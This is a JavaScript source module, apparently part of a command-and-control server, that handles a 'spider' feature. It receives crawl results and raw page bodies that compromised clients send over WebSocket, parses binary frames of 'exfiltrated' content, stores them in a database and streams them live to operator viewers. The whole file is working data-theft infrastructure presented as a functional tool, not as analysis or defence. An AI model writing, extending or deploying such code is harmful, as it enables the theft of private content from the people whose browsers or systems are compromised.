/**
 * Server-side spider payload handler.
 * Receives crawler results and exfiltrated content from the client,
 * persists them to the DB, and forwards events to connected viewers.
 */
import { broadcast } from "../ws-utils.js";

/** Hard server-side content size limit (50 MB). Client config limit is typically lower. */
const MAX_CONTENT_SIZE = 50 * 1024 * 1024;

/** Format a byte count as a human-readable string. */
function fmtBytes(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(1)} MB`;
}

/**
 * Initialize per-client spider handler state.
 * Results are stored in and loaded from the DB so they survive reconnects.
 * @param {object} db - The database layer (from db.js)
 * @param {string} clientId - The client's UUID
 * @param {Function} [storeLog] - Optional storeLog(clientId, entry) for DB-persisted log entries.
 */
export function initState(db, clientId, storeLog = () => {}) {
  const state = {
    viewers: new Set(),
    clientId,
    db,
    storeLog,
  };
  // Expose results as a DB-backed getter — always reflects persisted data
  Object.defineProperty(state, "results", {
    get() {
      return db.getSpiderResults(clientId);
    },
    enumerable: true,
  });
  return state;
}

export function onMessage(state, data, pushToViewers) {
  if (data.type === "result") {
    const discoveredAt = data.discoveredAt || Date.now();
    state.db.insertSpiderResult(
      state.clientId,
      data.url,
      data.status,
      data.depth,
      discoveredAt,
      data.contentType || '',
      data.size || 0
    );
    console.log(`  [spider] Discovered: ${data.url} (depth ${data.depth})`);
    pushToViewers();
  } else if (data.type === "status") {
    broadcast(state.viewers, JSON.stringify({ type: "status", ...data }));
  } else if (data.type === "done") {
    console.log(
      `  [spider] Done — ${data.discovered} discovered, ${data.crawled} crawled`
    );
    state.storeLog(state.clientId, {
      level: "info",
      source: "spider",
      message: `Crawl complete — ${data.discovered} URL(s) discovered, ${data.crawled} crawled`,
      timestamp: Date.now(),
    });
    broadcast(state.viewers, JSON.stringify({ type: "done", ...data }));
  } else if (data.type === "exfiltrate-progress") {
    // Forward manual exfiltration progress to viewers and persist to log
    broadcast(state.viewers, JSON.stringify({ type: "exfiltrate-progress", ...data }));
    if (data.status === "done") {
      state.storeLog(state.clientId, {
        level: "info",
        source: "spider",
        message: `Exfiltrated: ${data.url}${data.size != null ? ` (${fmtBytes(data.size)})` : ""}`,
        timestamp: Date.now(),
      });
    } else if (data.status === "error") {
      state.storeLog(state.clientId, {
        level: "warn",
        source: "spider",
        message: `Exfiltrate error: ${data.url}${data.error ? ` — ${data.error}` : ""}`,
        timestamp: Date.now(),
      });
    }
  }
}

/**
 * Handle a binary frame containing an exfiltrated page body.
 *
 * Binary data format (the portion after the outer name prefix, see shared/binary-frame.js):
 *   [4 bytes: JSON metadata length, big-endian uint32]
 *   [N bytes: JSON { url, contentType }]
 *   [rest: raw content bytes]
 *
 * Note: this handler broadcasts a targeted "content-stored" event directly rather than
 * delegating to the generic `pushToViewers` callback. That callback sends the full results
 * list, which would be wasteful for a content upload notification.
 *
 * @param {object} state - Per-client handler state from initState()
 * @param {Buffer|Uint8Array} data - Binary frame payload (name prefix already stripped by C2)
 * @param {Function} pushToViewers - Callback to broadcast to all viewers (unused here)
 */
export function onBinary(state, data, _pushToViewers) {
  const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
  if (buf.length < 4) return;

  const metaLen = buf.readUInt32BE(0);
  if (buf.length < 4 + metaLen) return;

  let meta;
  try {
    meta = JSON.parse(buf.slice(4, 4 + metaLen).toString());
  } catch {
    return;
  }

  const content = buf.slice(4 + metaLen);

  // Hard size guard — reject oversized uploads before touching the DB
  if (content.length > MAX_CONTENT_SIZE) {
    console.warn(`  [spider] Rejected oversized content (${content.length} bytes) for ${meta.url}`);
    return;
  }

  const contentType = (meta.contentType || '').split(';')[0].trim();
  state.db.insertSpiderContent(
    state.clientId,
    meta.url,
    contentType,
    content,
    content.length,
    Date.now()
  );
  console.log(`  [spider] Stored content: ${meta.url} (${content.length} bytes, ${contentType})`);
  state.storeLog(state.clientId, {
    level: "info",
    source: "spider",
    message: `Content stored: ${meta.url} (${fmtBytes(content.length)}, ${contentType || "unknown type"})`,
    timestamp: Date.now(),
  });

  broadcast(state.viewers, JSON.stringify({
    type: "content-stored",
    url: meta.url,
    contentType,
    size: content.length,
  }));
}

/**
 * Called when the client WebSocket closes.
 * Notifies connected viewers that the spider stream has ended.
 * @param {object} state - Per-client handler state from initState()
 */
export function onDisconnect(state) {
  if (state.viewers.size === 0) return;
  broadcast(state.viewers, JSON.stringify({ type: "disconnected" }));
}

export function onViewerConnect(state, ws) {
  state.viewers.add(ws);
  const results = state.db.getSpiderResults(state.clientId);
  const contentUrls = state.db.getSpiderContentUrls(state.clientId);
  ws.send(JSON.stringify({ type: "init", results, contentUrls }));
  ws.on("close", () => state.viewers.delete(ws));
}

export function pushToAllViewers(state) {
  if (state.viewers.size === 0) return;
  const results = state.db.getSpiderResults(state.clientId);
  const contentUrls = state.db.getSpiderContentUrls(state.clientId);
  broadcast(state.viewers, JSON.stringify({ type: "results", results, contentUrls }));
}
